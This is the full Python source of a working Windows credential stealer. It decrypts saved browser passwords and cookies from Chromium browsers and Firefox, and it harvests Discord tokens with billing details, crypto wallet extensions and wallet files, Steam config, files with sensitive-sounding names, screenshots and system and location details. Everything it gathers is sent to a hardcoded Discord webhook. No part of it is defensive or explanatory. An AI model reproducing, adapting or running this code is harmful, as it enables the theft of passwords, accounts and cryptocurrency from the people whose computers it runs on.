import os
import re
import sys
import json
import time
import base64
import random
import shutil
import sqlite3
import socket
import subprocess
import threading
import uuid          
import zipfile       
from ctypes import (windll, wintypes, byref, cdll, c_buffer, c_void_p, c_char,
                    c_char_p, c_uint, c_bool, Structure, POINTER, string_at, cast)
from urllib.request import Request, urlopen
from zipfile import ZipFile
from sys import executable

HOOK     = "https://discord.com/api/webhooks/1562590406414172222/Y4V3VqSIAhglMWBCaY-Ziqg4YcxWQXo0QkhG_TkTXvvtvC--S8MQDtkFiPcIN88BXW2D"
USERNAME = "ZAF HADIS"        
AVATAR   = "https://cdn.discordapp.com/attachments/1560305766039027712/1564758274849513533/image.png?ex=6ae26e34&is=6ae11cb4&hm=d3b540907acbfcbae33263a66fac31175ae22d6f37203297ecd4f0cfdac09475&"
FOOTER   = "love kani"
COLOR    = 14406413

SEND_SYSINFO    = True
SEND_ZIP        = True
SEND_SCREENSHOT = True
KIWI_SCAN       = True
ZIP_WALLETS     = True
KILL_BROWSERS   = False        
USE_THREADS     = True
VERBOSE         = True

MAX_WEBHOOK_MB  = 7.5          

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

local   = os.getenv("LOCALAPPDATA", "")
roaming = os.getenv("APPDATA", "")
temp    = os.getenv("TEMP", os.getenv("TMP", "."))
home    = os.path.expanduser("~")

BROWSERS = [
    ("Chrome",        f"{local}/Google/Chrome/User Data",                   "chrome.exe"),
    ("Chrome Beta",   f"{local}/Google/Chrome Beta/User Data",              "chrome.exe"),
    ("Chrome Dev",    f"{local}/Google/Chrome Dev/User Data",               "chrome.exe"),
    ("Chrome Canary", f"{local}/Google/Chrome SxS/User Data",               "chrome.exe"),
    ("Chromium",      f"{local}/Chromium/User Data",                        "chrome.exe"),
    ("Edge",          f"{local}/Microsoft/Edge/User Data",                  "msedge.exe"),
    ("Edge Beta",     f"{local}/Microsoft/Edge Beta/User Data",             "msedge.exe"),
    ("Edge Dev",      f"{local}/Microsoft/Edge Dev/User Data",              "msedge.exe"),
    ("Edge Canary",   f"{local}/Microsoft/Edge SxS/User Data",              "msedge.exe"),
    ("Brave",         f"{local}/BraveSoftware/Brave-Browser/User Data",     "brave.exe"),
    ("Brave Beta",    f"{local}/BraveSoftware/Brave-Browser-Beta/User Data", "brave.exe"),
    ("Brave Nightly", f"{local}/BraveSoftware/Brave-Browser-Nightly/User Data", "brave.exe"),
    ("Vivaldi",       f"{local}/Vivaldi/User Data",                         "vivaldi.exe"),
    ("Yandex",        f"{local}/Yandex/YandexBrowser/User Data",            "browser.exe"),
    ("Opera",         f"{roaming}/Opera Software/Opera Stable",             "opera.exe"),
    ("Opera GX",      f"{roaming}/Opera Software/Opera GX Stable",          "opera.exe"),
    ("Slimjet",       f"{local}/Slimjet/User Data",                         "slimjet.exe"),
]

DISCORD_PATHS = [
    f"{roaming}/Discord",
    f"{roaming}/discordcanary",
    f"{roaming}/discordptb",
    f"{roaming}/discorddevelopment",
    f"{roaming}/Lightcord",
]

WALLET_EXT = "nkbihfbeogaeaoehlefnkodbefgpgknn"     

KEYWORDS = [
    "mail", "[coinbase](https://coinbase.com)", "[gmail](https://gmail.com)",
    "[steam](https://steam.com)", "[discord](https://discord.com)",
    "[riotgames](https://riotgames.com)", "[youtube](https://youtube.com)",
    "[instagram](https://instagram.com)", "[tiktok](https://tiktok.com)",
    "[twitter](https://twitter.com)", "[facebook](https://facebook.com)",
    "card", "[epicgames](https://epicgames.com)", "[spotify](https://spotify.com)",
    "[yahoo](https://yahoo.com)", "[roblox](https://roblox.com)",
    "[twitch](https://twitch.com)", "bank", "[paypal](https://paypal.com)",
    "[amazon](https://amazon.com)", "[ebay](https://ebay.com)",
    "[xbox](https://xbox.com)", "buy", "sell", "[binance](https://binance.com)",
    "[hotmail](https://hotmail.com)", "[outlook](https://outlook.com)",
    "[netflix](https://netflix.com)", "crypto", "[uber](https://uber.com)",
    "[playstation](https://playstation.com)", "[crunchyroll](https://crunchyroll.com)",
    "[telegram](https://telegram.com)", "[origin](https://origin.com)",
]

KIWI_KEYWORDS = [
    "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account",
    "acount", "paypal", "banque", "metamask", "wallet", "crypto", "exodus",
    "2fa", "code", "memo", "compte", "token", "backup", "seecret", "seed",
    "recovery", "phrase", "private",
]

Passw, Cookies, Tokens       = [], [], []
paswWords, cookiWords        = [], []          
ZipList, LOG, KiwiFiles      = [], [], []
DLL_DIRS                     = []
LOCK                         = threading.Lock()


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    with LOCK:
        LOG.append(line)
    if VERBOSE:
        try:
            print(line)
        except Exception:
            pass


def add(bucket, item):
    with LOCK:
        bucket.append(item)


def register_token(token):
    """True if this token is new."""
    with LOCK:
        if token in Tokens:
            return False
        Tokens.append(token)
        return True

for _mod, _pip in (("requests", "requests"), ("Crypto.Cipher", "pycryptodome")):
    try:
        __import__(_mod)
    except Exception:
        try:
            subprocess.run(f'"{executable}" -m pip install {_pip} --quiet',
                           shell=True, timeout=180)
        except Exception:
            pass

try:
    from Crypto.Cipher import AES
except Exception:
    AES = None
    log("[!] pycryptodome missing - v10/v11/v20 decryption disabled")

try:
    import pyautogui
except Exception:
    pyautogui = None

try:
    from PIL import ImageGrab
except Exception:
    ImageGrab = None

class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def _blob_out(blob_out):
    try:
        n = int(blob_out.cbData)
        buf = c_buffer(n)
        cdll.msvcrt.memcpy(buf, blob_out.pbData, n)
        windll.kernel32.LocalFree(blob_out.pbData)
        return buf.raw
    except Exception:
        return b""


def dpapi(blob, entropy=b""):
    """CryptUnprotectData wrapper. Returns b'' on failure."""
    try:
        if not blob:
            return b""
        b_in  = c_buffer(blob, len(blob))
        b_ent = c_buffer(entropy, len(entropy))
        inb   = DATA_BLOB(len(blob), b_in)
        entb  = DATA_BLOB(len(entropy), b_ent)
        outb  = DATA_BLOB()
        if windll.crypt32.CryptUnprotectData(
                byref(inb), None, byref(entb), None, None, 0x01, byref(outb)):
            return _blob_out(outb)
    except Exception:
        pass
    return b""

APP_BOUND_HARDCODED = [
    bytes([0xB3, 0x1C, 0x6E, 0x24, 0x0F, 0x0F, 0x0F, 0x0F,
           0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
           0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
           0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F]),
    bytes([0xB3, 0x1C, 0x6E, 0x24, 0x0F, 0x0F, 0x0F, 0x0F,
           0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F]),
]


def keys_from_local_state(local_state_path):
    """-> {'v10': key|None, 'v20': [candidate keys]}. Never raises."""
    out = {"v10": None, "v20": []}
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            state = json.load(f)
    except Exception as e:
        log(f"    [x] Local State unreadable ({os.path.basename(os.path.dirname(local_state_path))}): {e}")
        return out

    try:
        raw = base64.b64decode(state["os_crypt"]["encrypted_key"])
        key = dpapi(raw[5:])
        if len(key) == 32:
            out["v10"] = key
            log("    [+] v10 key extracted (32 bytes)")
        else:
            log(f"    [x] v10 key wrong length: {len(key)}")
    except Exception as e:
        log(f"    [x] v10 key failed: {e}")

    try:
        raw = base64.b64decode(state["os_crypt"]["app_bound_encrypted_key"])
        if raw[:4] == b"APPB":
            inner = dpapi(raw[4:])
            log(f"    [+] app-bound blob: {len(inner)} bytes")
            if len(inner) >= 32:
                out["v20"].append(inner[:32])            
            if len(inner) > 32 and AES:
                nonce, body = inner[4:16], inner[16:]    
                for hk in APP_BOUND_HARDCODED:
                    try:
                        pt = AES.new(hk, AES.MODE_GCM, nonce).decrypt(body)[:-16]
                        if len(pt) == 32:
                            out["v20"].append(pt)
                    except Exception:
                        pass
            log(f"    [+] v20 candidates: {len(out['v20'])}")
    except KeyError:
        pass
    except Exception as e:
        log(f"    [x] app-bound key failed: {e}")

    return out

def decrypt(blob, keys):
    """v10/v11/v20 AES-GCM + legacy DPAPI. Tags failures as <...>."""
    if not blob:
        return ""
    head = blob[:3]

    if head in (b"v10", b"v11"):
        k = keys.get("v10")
        if not (k and AES):
            return "<no-aes-key>"
        try:
            iv, body = blob[3:15], blob[15:]
            return AES.new(k, AES.MODE_GCM, iv).decrypt_and_verify(
                body[:-16], body[-16:]).decode("utf-8", "ignore")
        except Exception:
            try:
                return AES.new(k, AES.MODE_GCM, blob[3:15]).decrypt(
                    blob[15:])[:-16].decode("utf-8", "ignore")
            except Exception:
                return "<v10-fail>"

    if head == b"v20":
        if not AES:
            return "<no-aes-key>"
        for k in keys.get("v20", []):
            if len(k) != 32:
                continue
            try:
                iv, body = blob[3:15], blob[15:]
                return AES.new(k, AES.MODE_GCM, iv).decrypt_and_verify(
                    body[:-16], body[-16:]).decode("utf-8", "ignore")
            except Exception:
                continue
        return "<v20-fail>"

    try:
        return dpapi(blob).decode("utf-8", "ignore")
    except Exception:
        return "<dpapi-fail>"

def copy_db(src):
    """Copy SQLite DB + WAL/SHM/journal sidecars into a private folder."""
    try:
        d = os.path.join(temp, "db" + "".join(random.choice("abcdefghijklmnop") for _ in range(10)))
        os.makedirs(d, exist_ok=True)
        dst = os.path.join(d, os.path.basename(src))
        for suffix in ("", "-wal", "-shm", "-journal"):
            if os.path.isfile(src + suffix):
                shutil.copy2(src + suffix, dst + suffix)
        return d, dst
    except Exception as e:
        log(f"    [x] copy failed {src}: {e}")
        return None, None


def profiles_of(root):
    """Every real profile, or [''] when root itself is the profile (Opera)."""
    try:
        if not os.path.isdir(root):
            return []
        subs = []
        if os.path.isdir(os.path.join(root, "Default")):
            subs.append("Default")
        for d in sorted(os.listdir(root)):
            if d.startswith("Profile ") or d in ("Guest Profile", "System Profile"):
                subs.append(d)
        return subs or [""]
    except Exception:
        return [""]


def note_keyword(haystack, bucket):
    """Record which known sites were touched."""
    try:
        for wa in KEYWORDS:
            probe = wa.split("[")[1].split("]")[0] if "[" in wa else wa
            if probe in (haystack or ""):
                with LOCK:
                    if wa not in bucket:
                        bucket.append(wa)
    except Exception:
        pass

def grab_passwords(tag, pdir, keys):
    src = os.path.join(pdir, "Login Data")
    if not os.path.isfile(src):
        return
    d, db = copy_db(src)
    if not db:
        return
    try:
        con = sqlite3.connect(db)
        rows = []
        for q in ("SELECT origin_url, username_value, password_value FROM logins",
                  "SELECT action_url, username_value, password_value FROM logins"):
            try:
                rows = con.execute(q).fetchall()
                break
            except Exception:
                continue
        con.close()

        ok = 0
        for url, user, enc in rows:
            if not url and not user:
                continue
            pw = decrypt(enc, keys)
            if pw and not pw.startswith("<"):
                ok += 1
            note_keyword(url, paswWords)
            add(Passw, f"[{tag}] URL: {url} | USER: {user} | PASS: {pw}")
        log(f"    [+] {tag}: {len(rows)} logins ({ok} decrypted)")
    except Exception as e:
        log(f"    [x] {tag} logins: {e}")
    finally:
        shutil.rmtree(d, ignore_errors=True)


def grab_cookies(tag, pdir, keys):
    src = None
    for candidate in (os.path.join(pdir, "Network", "Cookies"),
                      os.path.join(pdir, "Cookies")):
        if os.path.isfile(candidate):
            src = candidate
            break
    if not src:
        return
    d, db = copy_db(src)
    if not db:
        return
    try:
        con = sqlite3.connect(db)
        rows = con.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
        con.close()

        ok = 0
        for host, cname, enc in rows:
            if not host:
                continue
            val = decrypt(enc, keys)
            if val and not val.startswith("<"):
                ok += 1
            note_keyword(host, cookiWords)
            add(Cookies, f"[{tag}] HOST: {host} | NAME: {cname} | VALUE: {val}")
        log(f"    [+] {tag}: {len(rows)} cookies ({ok} decrypted)")
    except Exception as e:
        log(f"    [x] {tag} cookies: {e}")
    finally:
        shutil.rmtree(d, ignore_errors=True)


def grab_browser_tokens(tag, pdir):
    lv = os.path.join(pdir, "Local Storage", "leveldb")
    if not os.path.isdir(lv):
        return
    n = 0
    for f in os.listdir(lv):
        if not (f.endswith(".log") or f.endswith(".ldb")):
            continue
        try:
            with open(os.path.join(lv, f), "r", errors="ignore") as fh:
                lines = [x.strip() for x in fh if x.strip()]
        except Exception:
            continue
        for line in lines:
            for rx in (r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                for t in re.findall(rx, line):
                    if register_token(t):
                        if check_token(t):
                            upload_token(t, tag)
                            n += 1
                        else:
                            with LOCK:
                                Tokens.remove(t)
    if n:
        log(f"    [+] {tag}: {n} browser token(s)")


def harvest_browser(browser):
    name, root, _proc = browser
    if not os.path.isdir(root):
        return
    log(f"[*] {name}")
    for prof in profiles_of(root):
        pdir = os.path.join(root, prof) if prof else root
        tag  = f"{name}/{prof}" if prof else name

        ls = os.path.join(root, "Local State")
        if not os.path.isfile(ls):
            ls = os.path.join(pdir, "Local State")
        keys = keys_from_local_state(ls) if os.path.isfile(ls) else {"v10": None, "v20": []}

        grab_passwords(tag, pdir, keys)
        grab_cookies(tag, pdir, keys)
        grab_browser_tokens(tag, pdir)


def harvest_chromium():
    if not USE_THREADS:
        for b in BROWSERS:
            harvest_browser(b)
        return
    ths = []
    for b in BROWSERS:
        t = threading.Thread(target=harvest_browser, args=[b], daemon=True)
        t.start()
        ths.append(t)
    for t in ths:
        t.join(timeout=180)

class SECItem(Structure):
    _fields_ = [("type", c_uint), ("data", c_void_p), ("len", c_uint)]


def nss_load(profile_dir):
    for dll_dir in (r"C:\Program Files\Mozilla Firefox",
                    r"C:\Program Files (x86)\Mozilla Firefox"):
        if not os.path.isfile(os.path.join(dll_dir, "nss3.dll")):
            continue
        try:
            DLL_DIRS.append(os.add_dll_directory(dll_dir))
        except Exception:
            pass
        os.environ["PATH"] = dll_dir + ";" + os.environ.get("PATH", "")
        try:
            nss = cdll.LoadLibrary(os.path.join(dll_dir, "nss3.dll"))
            nss.NSS_Init.argtypes = [c_char_p]
            nss.PK11_GetInternalKeySlot.restype = c_void_p
            nss.PK11_Authenticate.argtypes = [c_void_p, c_bool, c_void_p]
            nss.PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
            nss.NSS_Init(profile_dir.encode())
            slot = nss.PK11_GetInternalKeySlot()
            nss.PK11_Authenticate(slot, True, None)
            return nss
        except Exception as e:
            log(f"    [x] NSS init: {e}")
            return None
    log("    [x] Firefox install not found")
    return None


def nss_decrypt(nss, b64):
    try:
        raw = base64.b64decode(b64)
        buf = c_buffer(raw, len(raw))
        item = SECItem(0, c_buffer(raw, len(raw)), len(raw))
        out = SECItem()
        if nss.PK11SDR_Decrypt(byref(item), byref(out), None) == 0:
            return string_at(out.data, out.len).decode("utf-8", "ignore")
    except Exception:
        pass
    return None


def harvest_firefox():
    base = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(base):
        return
    for prof in sorted(os.listdir(base)):
        pdir = os.path.join(base, prof)
        if not os.path.isdir(pdir):
            continue
        log(f"[*] Firefox/{prof}")
        nss = nss_load(pdir)

        lj = os.path.join(pdir, "logins.json")
        if os.path.isfile(lj):
            try:
                with open(lj, "r", encoding="utf-8") as f:
                    data = json.load(f)
                n = 0
                for e in data.get("logins", []):
                    user = e.get("usernameField", "")
                    pw   = e.get("passwordField", "")
                    if nss:
                        du, dpw = nss_decrypt(nss, user), nss_decrypt(nss, pw)
                        if du:
                            user = du
                        if dpw:
                            pw = dpw
                    note_keyword(e.get("hostname", ""), paswWords)
                    add(Passw, f"[Firefox/{prof}] URL: {e.get('hostname','')} | USER: {user} | PASS: {pw}")
                    n += 1
                log(f"    [+] {n} logins")
            except Exception as e:
                log(f"    [x] logins.json: {e}")

        cs = os.path.join(pdir, "cookies.sqlite")
        if os.path.isfile(cs):
            d, db = copy_db(cs)
            if db:
                try:
                    con = sqlite3.connect(db)
                    rows = con.execute("SELECT host, name, value FROM moz_cookies").fetchall()
                    con.close()
                    for host, cname, val in rows:
                        dv = nss_decrypt(nss, val) if nss else None
                        note_keyword(host, cookiWords)
                        add(Cookies, f"[Firefox/{prof}] HOST: {host} | NAME: {cname} | VALUE: {dv or val}")
                    log(f"    [+] {len(rows)} cookies")
                except Exception as e:
                    log(f"    [x] firefox cookies: {e}")
                finally:
                    shutil.rmtree(d, ignore_errors=True)

        if nss:
            try:
                nss.NSS_Shutdown()
            except Exception:
                pass

def harvest_discord_tokens():
    for path in DISCORD_PATHS:
        lv = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.isdir(lv):
            continue
        log(f"[*] Discord client: {os.path.basename(path)}")
        keys = keys_from_local_state(os.path.join(path, "Local State"))
        for f in os.listdir(lv):
            if not (f.endswith(".log") or f.endswith(".ldb")):
                continue
            try:
                with open(os.path.join(lv, f), "r", errors="ignore") as fh:
                    lines = [x.strip() for x in fh if x.strip()]
            except Exception:
                continue
            for line in lines:
                for enc in re.findall(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", line):
                    try:
                        t = decrypt(base64.b64decode(enc), keys)
                    except Exception:
                        continue
                    if t and not t.startswith("<") and register_token(t):
                        if check_token(t):
                            upload_token(t, path)
                        else:
                            with LOCK:
                                Tokens.remove(t)

def _multipart(fields, files):
    b = "----stealer" + str(random.randint(10 ** 8, 10 ** 9))
    body = b""
    for k, v in fields.items():
        body += f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
    for k, (fn, data) in files.items():
        body += (f'--{b}\r\nContent-Disposition: form-data; name="{k}"; filename="{fn}"\r\n'
                 f'Content-Type: application/octet-stream\r\n\r\n').encode() + data + b"\r\n"
    body += f"--{b}--\r\n".encode()
    return body, f"multipart/form-data; boundary={b}"


def send(payload, file_path=None):
    for attempt in range(5):
        try:
            if file_path and os.path.isfile(file_path):
                with open(file_path, "rb") as f:
                    raw = f.read()
                body, ctype = _multipart({"payload_json": json.dumps(payload)},
                                         {"file": (os.path.basename(file_path), raw)})
            else:
                body, ctype = json.dumps(payload).encode(), "application/json"
            req = Request(HOOK, data=body,
                          headers={"Content-Type": ctype, "User-Agent": USER_AGENT})
            r = urlopen(req, timeout=120)
            if r.getcode() in (200, 204):
                return True
            if r.getcode() == 413:
                log("    [!] 413 payload too large")
                return False
            log(f"    [x] webhook HTTP {r.getcode()}")
        except Exception as e:
            log(f"    [x] webhook try {attempt + 1}: {e}")
            time.sleep(1.5)
    return False


def api_get(endpoint, token):
    try:
        r = urlopen(Request(f"https://discord.com/api/v10{endpoint}",
                            headers={"Authorization": token,
                                     "User-Agent": USER_AGENT}), timeout=15)
        if r.getcode() == 200:
            return json.loads(r.read().decode())
    except Exception:
        pass
    return None


def check_token(t):
    return api_get("/users/@me", t) is not None


def upload_token(token, where):
    try:
        u = api_get("/users/@me", token)
        if not u:
            return
        uid = u.get("id", "?")
        pfp = u.get("avatar")
        pfp = f"https://cdn.discordapp.com/avatars/{uid}/{pfp}" if pfp else AVATAR

        billing = ""
        for m in (api_get("/users/@me/billing/payment-sources", token) or []):
            if not m.get("invalid"):
                billing += ":credit_card:" if m.get("type") == 1 else ":parking:"
        nitro = {1: ":classic: ", 2: ":boost: :classic: "}.get(u.get("premium_type"), "")

        send({"username": USERNAME, "avatar_url": AVATAR,
              "content": f"Found in `{where}`",
              "embeds": [{
                  "color": COLOR,
                  "author": {"name": f"{u.get('username')}#{u.get('discriminator')} ({uid})",
                             "icon_url": pfp},
                  "thumbnail": {"url": pfp},
                  "fields": [
                      {"name": ":rocket: Token", "value": f"`{token}`"},
                      {"name": ":envelope: Email", "value": f"`{u.get('email') or '-'}`", "inline": True},
                      {"name": ":mobile_phone: Phone", "value": f"`{u.get('phone') or '-'}`", "inline": True},
                      {"name": ":credit_card: Billing", "value": billing or "-", "inline": True},
                      {"name": ":beginner: Nitro", "value": nitro or "-", "inline": True},
                  ],
                  "footer": {"text": FOOTER, "icon_url": AVATAR}}]})
    except Exception as e:
        log(f"    [x] upload_token: {e}")

def getip():
    try:
        return urlopen(Request("https://api.ipify.org"), timeout=10).read().decode().strip()
    except Exception:
        return "None"


def send_sysinfo():
    if not SEND_SYSINFO:
        return
    try:
        city, country = "?", "?"
        try:
            g = json.loads(urlopen(Request(f"https://ipapi.co/{getip()}/json/"),
                                   timeout=10).read().decode())
            city, country = g.get("city", "?"), g.get("country_name", "?")
        except Exception:
            pass
        res = f"{windll.user32.GetSystemMetrics(0)}x{windll.user32.GetSystemMetrics(1)}"
        ram = "?"
        try:
            import psutil
            ram = f"{round(psutil.virtual_memory().total / 1024**3, 2)} GB"
        except Exception:
            pass
        hwid = "?"
        try:
            hwid = subprocess.check_output("wmic csproduct get uuid", shell=True,
                                           stderr=subprocess.DEVNULL).decode(
                                               errors="ignore").split("\n")[1].strip()
        except Exception:
            pass
        send({"username": USERNAME, "avatar_url": AVATAR, "embeds": [{
            "color": COLOR, "title": "System Recon",
            "fields": [
                {"name": "User", "value": f"`{os.environ.get('USERNAME','?')}`", "inline": True},
                {"name": "Host", "value": f"`{socket.gethostname()}`", "inline": True},
                {"name": "IP", "value": f"`{getip()}`", "inline": True},
                {"name": "Geo", "value": f"`{city}, {country}`", "inline": True},
                {"name": "Screen", "value": f"`{res}`", "inline": True},
                {"name": "RAM", "value": f"`{ram}`", "inline": True},
                {"name": "MAC", "value": f"`{':'.join(re.findall('..', '%012x' % uuid.getnode()))}`",
                 "inline": True},
                {"name": "HWID", "value": f"`{hwid}`", "inline": True},
                {"name": "CPU", "value": f"`{os.environ.get('PROCESSOR_IDENTIFIER','?')}`"},
            ],
            "footer": {"text": FOOTER, "icon_url": AVATAR}}]})
        log("[+] recon sent")
    except Exception as e:
        log(f"[x] sysinfo: {e}")


def screenshot(path):
    if not SEND_SCREENSHOT:
        return None
    try:
        if pyautogui:
            pyautogui.screenshot(path)
            return path
        if ImageGrab:
            ImageGrab.grab().save(path)
            return path
    except Exception as e:
        log(f"[x] screenshot: {e}")
    return None


def zip_dir(src, name):
    try:
        if not os.path.isdir(src):
            return None
        out = os.path.join(temp, f"{name}.zip")
        with ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
            for dp, _, fs in os.walk(src):
                for f in fs:
                    p = os.path.join(dp, f)
                    try:
                        z.write(p, arcname=f"{name}/" + os.path.relpath(p, src))
                    except Exception:
                        continue
        add(ZipList, out)
        log(f"[+] zipped {name}")
        return out
    except Exception as e:
        log(f"[x] zip {name}: {e}")
        return None


def zip_extras():
    targets = [
        (f"{roaming}/atomic/Local Storage/leveldb",        "Atomic_Wallet"),
        (f"{roaming}/Exodus/exodus.wallet",                "Exodus"),
        (f"{roaming}/NationsGlory/Local Storage/leveldb",  "NationsGlory"),
        (r"C:\Program Files (x86)\Steam\config",           "Steam"),
    ]
    for src, name in targets:
        zip_dir(src, name)


def zip_wallets():
    if not ZIP_WALLETS:
        return
    for name, root, proc in BROWSERS:
        if not os.path.isdir(root):
            continue
        for prof in profiles_of(root):
            pdir = os.path.join(root, prof) if prof else root
            ext = os.path.join(pdir, "Local Extension Settings", WALLET_EXT)
            if os.path.isdir(ext):
                zip_dir(ext, f"MetaMask_{name}_{prof or 'default'}")
                return          # first hit is enough, keeps the zip small


def kiwi_scan():
    if not KIWI_SCAN:
        return
    def scan(tgt):
        try:
            if not os.path.isdir(tgt):
                return
            found = []
            for f in os.listdir(tgt):
                full = os.path.join(tgt, f)
                for w in KIWI_KEYWORDS:
                    if w in f.lower():
                        if os.path.isfile(full):
                            found.append(full)
                        elif os.path.isdir(full):
                            for sub in sorted(os.listdir(full))[:8]:
                                sp = os.path.join(full, sub)
                                if os.path.isfile(sp):
                                    found.append(sp)
                        break
            if found:
                with LOCK:
                    KiwiFiles.append((tgt, found))
        except Exception:
            pass

    ths = []
    for tgt in (os.path.join(home, "Desktop"),
                os.path.join(home, "Downloads"),
                os.path.join(home, "Documents")):
        t = threading.Thread(target=scan, args=[tgt], daemon=True)
        t.start()
        ths.append(t)
    for t in ths:
        t.join(timeout=30)

    if not KiwiFiles:
        return
    txt = ""
    for folder, files in KiwiFiles:
        txt += f"• `{folder}`\n" + "".join(f"... {os.path.basename(f)}\n" for f in files[:10]) + "\n"
    send({"username": USERNAME, "avatar_url": AVATAR, "embeds": [{
        "color": COLOR, "title": "Interesting files", "description": txt[:4000],
        "footer": {"text": FOOTER, "icon_url": AVATAR}}]})

def write_out():
    def w(name, header, lines):
        try:
            with open(os.path.join(temp, name), "w", encoding="utf-8") as f:
                f.write(header + "\n")
                for l in lines:
                    f.write(l + "\n")
        except Exception as e:
            log(f"[x] write {name}: {e}")

    w("wppassw.txt", f"<-- {FOOTER} | {len(Passw)} credentials -->", Passw)
    w("wcook.txt",   f"<-- {FOOTER} | {len(Cookies)} cookies -->",   Cookies)
    w("wtokens.txt", f"<-- {FOOTER} | {len(Tokens)} live tokens -->", Tokens)
    w("wpdebug.txt", f"<-- {FOOTER} diagnostics -->", LOG)


def build_zip():
    try:
        out = os.path.join(temp, "data.zip")
        shot = screenshot(os.path.join(temp, "screenshot.png"))
        with ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
            for f in os.listdir(temp):
                if f.startswith("wp") and f.endswith(".txt"):
                    z.write(os.path.join(temp, f), arcname=f)
            for zf in ZipList:
                if os.path.isfile(zf):
                    z.write(zf, arcname=os.path.basename(zf))
            if shot and os.path.isfile(shot):
                z.write(shot, arcname="screenshot.png")
        return out
    except Exception as e:
        log(f"[x] build_zip: {e}")
        return None


def send_summary():
    browsers = sorted({p.split("]")[0][1:] for p in Passw} |
                      {c.split("]")[0][1:] for c in Cookies})
    send({"username": USERNAME, "avatar_url": AVATAR, "embeds": [{
        "color": COLOR,
        "title": "Loot Summary",
        "author": {"name": f"{os.environ.get('USERNAME','?')}@{socket.gethostname()}",
                   "icon_url": AVATAR},
        "fields": [
            {"name": "Passwords", "value": f"`{len(Passw)}`", "inline": True},
            {"name": "Cookies",   "value": f"`{len(Cookies)}`", "inline": True},
            {"name": "Tokens",    "value": f"`{len(Tokens)}`", "inline": True},
            {"name": "Sources",   "value": "`, `".join(browsers)[:900] or "-"},
            {"name": "Sites",     "value": ", ".join((paswWords + cookiWords)[:20])[:900] or "-"},
        ],
        "footer": {"text": FOOTER, "icon_url": AVATAR}}]})

def main():
    log(f"=== {FOOTER} start ===")
    if not AES:
        log("[!] no AES backend - install pycryptodome, then rerun")

    send_sysinfo()

    log("[*] scanning chromium browsers")
    harvest_chromium()

    log("[*] scanning firefox")
    try:
        harvest_firefox()
    except Exception as e:
        log(f"[x] firefox: {e}")

    log("[*] scanning discord clients")
    try:
        harvest_discord_tokens()
    except Exception as e:
        log(f"[x] discord: {e}")

    zip_extras()
    zip_wallets()
    kiwi_scan()

    write_out()
    log(f"[=] totals: {len(Passw)} creds / {len(Cookies)} cookies / {len(Tokens)} tokens")
    send_summary()

    if SEND_ZIP:
        z = build_zip()
        if z:
            size_mb = os.path.getsize(z) / 1024 / 1024
            if size_mb <= MAX_WEBHOOK_MB:
                send({"username": USERNAME, "avatar_url": AVATAR,
                      "content": f"**Archive** `{size_mb:.2f} MB` — "
                                 f"`{os.environ.get('USERNAME','?')}@{socket.gethostname()}`"},
                     file_path=z)
            else:
                log(f"[!] zip {size_mb:.2f} MB too big, sending parts")
                for part in ("wpdebug.txt", "wppassw.txt", "wcook.txt", "wtokens.txt"):
                    p = os.path.join(temp, part)
                    if os.path.isfile(p):
                        send({"username": USERNAME, "avatar_url": AVATAR,
                              "content": f"`{part}`"}, file_path=p)
    log("=== done ===")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"[-] FATAL: {e}")
        try:
            write_out()
        except Exception:
            pass
